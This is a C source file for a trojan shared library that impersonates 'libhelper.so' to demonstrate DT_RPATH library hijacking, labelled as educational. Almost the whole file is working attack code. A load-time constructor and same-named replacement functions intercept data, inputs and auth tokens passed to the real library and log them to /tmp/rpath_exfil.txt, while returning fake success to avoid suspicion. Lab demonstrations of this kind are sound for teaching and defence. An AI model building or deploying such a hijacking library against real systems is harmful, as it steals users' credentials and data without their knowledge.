/*
 * evil_libhelper.c - Malicious Library (Trojan)
 *
 * This library masquerades as libhelper.so but contains malicious code.
 * When placed in a directory that appears earlier in the library search
 * path (via DT_RPATH/DT_RUNPATH exploitation), it will be loaded instead
 * of the legitimate library.
 *
 * Attack capabilities:
 *   - Steal sensitive data passed to library functions
 *   - Execute arbitrary code before/after legitimate operations
 *   - Modify return values to change program behavior
 *   - Establish persistence or backdoors
 *
 * Compile: gcc -shared -fPIC -o libhelper.so evil_libhelper.c
 *
 * EDUCATIONAL PURPOSES ONLY
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>

/* Color codes */
#define RED     "\033[1;31m"
#define YELLOW  "\033[1;33m"
#define GREEN   "\033[1;32m"
#define MAGENTA "\033[1;35m"
#define RESET   "\033[0m"

/* Log file for stolen data */
#define EXFIL_LOG "/tmp/rpath_exfil.txt"

/* Helper: Log stolen data */
static void exfiltrate(const char *type, const char *data) {
    FILE *log = fopen(EXFIL_LOG, "a");
    if (log) {
        time_t now = time(NULL);
        fprintf(log, "[%ld] %s: %s\n", now, type, data);
        fclose(log);
    }
}

/* ═══════════════════════════════════════════════════════════════════════════
 * CONSTRUCTOR - Runs when library is loaded
 * ═══════════════════════════════════════════════════════════════════════════ */

__attribute__((constructor))
void evil_init(void) {
    /* Clear previous log */
    FILE *log = fopen(EXFIL_LOG, "w");
    if (log) {
        fprintf(log, "═══════════════════════════════════════════════════════\n");
        fprintf(log, "  DT_RPATH EXPLOITATION - EXFILTRATION LOG\n");
        fprintf(log, "  PID: %d\n", getpid());
        fprintf(log, "═══════════════════════════════════════════════════════\n\n");
        fclose(log);
    }

    fprintf(stderr, "\n");
    fprintf(stderr, RED "╔════════════════════════════════════════════════════════╗\n" RESET);
    fprintf(stderr, RED "║" YELLOW "  ⚠ MALICIOUS LIBRARY LOADED VIA RPATH HIJACKING ⚠     " RED "║\n" RESET);
    fprintf(stderr, RED "║" RESET "                                                        " RED "║\n" RESET);
    fprintf(stderr, RED "║" RESET "  The application loaded " RED "evil_libhelper.so" RESET " instead      " RED "║\n" RESET);
    fprintf(stderr, RED "║" RESET "  of the legitimate libhelper.so                        " RED "║\n" RESET);
    fprintf(stderr, RED "║" RESET "                                                        " RED "║\n" RESET);
    fprintf(stderr, RED "║" RESET "  All function calls will be intercepted!               " RED "║\n" RESET);
    fprintf(stderr, RED "╚════════════════════════════════════════════════════════╝\n" RESET);
    fprintf(stderr, "\n");

    exfiltrate("INIT", "Malicious library loaded");
}

/* ═══════════════════════════════════════════════════════════════════════════
 * TROJAN FUNCTIONS - Same interface as legitimate library
 * ═══════════════════════════════════════════════════════════════════════════ */

/* Trojan: Process user data - STEAL IT! */
int process_data(const char *data) {
    fprintf(stderr, RED "[EVIL] " YELLOW "process_data() intercepted!" RESET "\n");
    fprintf(stderr, RED "[EVIL] " MAGENTA "Captured data: \"%s\"" RESET "\n", data);

    /* Exfiltrate the data */
    exfiltrate("DATA", data);

    /* Return fake success */
    printf("[libhelper] Processing data: [REDACTED]\n");
    return strlen(data);
}

/* Trojan: Validate input - Always succeed to avoid suspicion */
int validate_input(const char *input) {
    fprintf(stderr, RED "[EVIL] " YELLOW "validate_input() intercepted!" RESET "\n");

    if (input) {
        exfiltrate("INPUT", input);
    }

    /* Always return success to keep program running */
    printf("[libhelper] Input validated successfully\n");
    return 1;
}

/* Trojan: Get version - Return fake version */
const char *get_version(void) {
    fprintf(stderr, RED "[EVIL] " YELLOW "get_version() intercepted!" RESET "\n");

    /* Return version that looks legitimate but is marked */
    return "1.0.0 " RED "(COMPROMISED)" RESET;
}

/* Trojan: Sensitive operation - STEAL AUTH TOKEN! */
int sensitive_operation(const char *auth_token) {
    fprintf(stderr, RED "[EVIL] " YELLOW "sensitive_operation() intercepted!" RESET "\n");
    fprintf(stderr, RED "[EVIL] " RED "★ CAPTURED AUTH TOKEN: %s ★" RESET "\n", auth_token);

    /* This is the jackpot - log the auth token */
    exfiltrate("AUTH_TOKEN", auth_token);

    /* Pretend to do the operation */
    printf("[libhelper] Performing sensitive operation...\n");
    printf("[libhelper] Auth token: [HIDDEN]\n");
    printf("[libhelper] Operation completed securely.\n");

    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * DESTRUCTOR - Cleanup and final exfiltration
 * ═══════════════════════════════════════════════════════════════════════════ */

__attribute__((destructor))
void evil_fini(void) {
    fprintf(stderr, "\n");
    fprintf(stderr, RED "╔════════════════════════════════════════════════════════╗\n" RESET);
    fprintf(stderr, RED "║" YELLOW "  ★ RPATH HIJACK SESSION COMPLETE ★                    " RED "║\n" RESET);
    fprintf(stderr, RED "║" RESET "  Stolen data saved to: " MAGENTA "/tmp/rpath_exfil.txt" RESET "        " RED "║\n" RESET);
    fprintf(stderr, RED "╚════════════════════════════════════════════════════════╝\n" RESET);
    fprintf(stderr, "\n");

    exfiltrate("FINI", "Session complete - all data exfiltrated");
}
